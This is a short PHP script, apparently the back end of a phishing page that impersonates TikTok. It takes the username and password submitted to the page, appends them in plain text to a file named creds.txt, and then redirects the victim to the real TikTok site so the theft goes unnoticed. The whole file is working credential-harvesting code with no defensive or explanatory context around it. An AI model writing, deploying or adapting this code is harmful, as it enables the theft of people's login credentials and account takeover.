<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $data = "Username: $username | Password: $password\n";

    file_put_contents("creds.txt", $data, FILE_APPEND);
    header("Location: https://www.tiktok.com"); // Redirect to real TikTok
    exit();
}
?>
